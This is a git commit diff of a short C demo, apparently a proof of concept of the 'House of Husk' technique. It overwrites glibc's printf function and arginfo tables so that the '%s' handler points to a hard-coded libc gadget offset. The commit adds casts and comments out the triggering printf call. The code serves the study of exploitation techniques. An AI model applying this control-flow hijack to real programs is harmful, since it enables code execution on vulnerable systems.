809ed54ebd02dd47c76f23ab4fff3dd7bc850d16
dbgbgtf <dudududuMaxVer@outlook.com>
2025-09-16 09:36:24 +0800

    test a.out

--- houseofhusk/demo.c
+++ houseofhusk/demo.c
@@ -1,13 +1,14 @@
 #include <stdio.h>
+#include <stdlib.h>
 
 int main()
 {
-    long libc_base = &printf - 0x60770;
+    long libc_base = (long)(&printf - 0x60770);
     long printf_function_table = libc_base + 0x21b9c8;
     long printf_arginfo_table = libc_base + 0x21a8b0;
     *(long*)printf_function_table = 100;
-    *(long*)printf_arginfo_table = malloc(0x1000);
+    *(long*)printf_arginfo_table = (long)malloc(0x1000);
     ((long*)(*(long*)printf_arginfo_table))[0x73] = libc_base + 0xebdb3;
-    printf("%s","deadbeef");
+    // printf("%s","deadbeef");
     return 0;
 }
